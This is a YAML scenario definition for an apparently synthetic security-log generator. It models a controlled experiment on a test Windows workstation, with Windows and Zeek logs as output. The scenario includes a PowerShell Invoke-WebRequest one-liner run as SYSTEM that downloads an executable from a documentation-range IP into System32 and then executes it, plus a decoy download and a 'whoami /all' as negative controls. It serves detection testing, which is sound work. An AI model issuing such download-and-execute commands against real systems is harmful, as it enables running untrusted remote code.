@@ -1,0 +1,120 @@
+version: "1.0"
+name: content-identity-witness-v1-13-1
+description: |
+  Controlled EvidenceForge v1.13.1 experiment. One storyline cluster downloads an HTTP
+  response to an exact output path and then executes that same path. The canonical ground
+  truth serializes the URL and output path on the first process plus the identical process
+  path on the second. This establishes one modeled logical file, not shared materialized
+  bytes. Unrelated transfer and process events are negative controls.
+
+environment:
+  description: "One isolated Windows workstation and one network observation sensor"
+  domain: "artifactforge.test"
+  users:
+    - username: casey.analyst
+      full_name: "Casey Analyst"
+      email: "casey.analyst@artifactforge.test"
+      persona: analyst
+      primary_system: WS-AF-01
+      enabled: true
+  service_accounts: [SYSTEM]
+  systems:
+    - hostname: WS-AF-01
+      ip: "192.0.2.10"
+      os: "Windows 11 Enterprise"
+      type: workstation
+      assigned_user: casey.analyst
+      services: ["dns-client"]
+  network:
+    segments:
+      - name: workstations
+        cidr: "192.0.2.0/24"
+        description: "RFC 5737 documentation-only workstation segment"
+        exposure: internal
+        systems: [WS-AF-01]
+    sensors:
+      - type: network
+        name: af-span
+        hostname: ZEEK-AF-01
+        monitoring_segments: [workstations]
+        direction: bidirectional
+        placement: span
+        log_formats: [zeek]
+        description: "Controlled network observation point"
+
+time_window:
+  start: "2024-05-14T12:00:00Z"
+  duration: "2h"
+  warmup: "1h"
+
+baseline_activity:
+  description: "Low-volume background retained so the positive and negative controls coexist"
+  intensity: low
+  variation: low
+  traffic_rates:
+    web: low
+    user_activity: low
+    persona_connections: low
+
+observation_profile: complete
+
+storyline:
+  - id: controlled-logon
+    time: "+10m"
+    actor: casey.analyst
+    system: WS-AF-01
+    activity: "Establish the interactive session used by the controlled events"
+    events:
+      - type: logon
+        logon_type: 2
+
+  - id: controlled-download-execute
+    time: "+20m"
+    actor: SYSTEM
+    system: WS-AF-01
+    activity: "Download the controlled file and execute that exact output path"
+    event_spacing:
+      mode: explicit_offsets
+      offsets: ["0s", "30s"]
+    events:
+      - type: process
+        description: "Positive control: HTTP response is written to the later execution path"
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Invoke-WebRequest -Uri 'http://203.0.113.10/af-controlled.exe' -OutFile 'C:\\Windows\\System32\\af-controlled.exe'\""
+        supplementary: none
+      - type: process
+        description: "Positive control: execute the exact path written by the prior event"
+        process_name: "C:\\Windows\\System32\\af-controlled.exe"
+        command_line: "C:\\Windows\\System32\\af-controlled.exe --inert-demo"
+        supplementary: none
+
+  - id: unrelated-download
+    time: "+35m"
+    actor: casey.analyst
+    system: WS-AF-01
+    activity: "Download a same-basename decoy to a different path that is never executed"
+    events:
+      - type: process
+        description: "Negative control: same basename, different path, never executed"
+        process_name: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        command_line: "powershell.exe -NoProfile -Command \"Invoke-WebRequest -Uri 'http://203.0.113.20/af-controlled.exe' -OutFile 'C:\\Windows\\Temp\\af-controlled.exe'\""
+        supplementary: none
+
+  - id: unrelated-execution
+    time: "+50m"
+    actor: casey.analyst
+    system: WS-AF-01
+    activity: "Run an unrelated program as a process-side negative control"
+    events:
+      - type: process
+        description: "Negative control: process only"
+        process_name: "C:\\Windows\\System32\\whoami.exe"
+        command_line: "whoami.exe /all"
+        supplementary: none
+
+output:
+  logs:
+    - format: windows
+    - format: zeek
+  destination: "./output"
+  compression: false
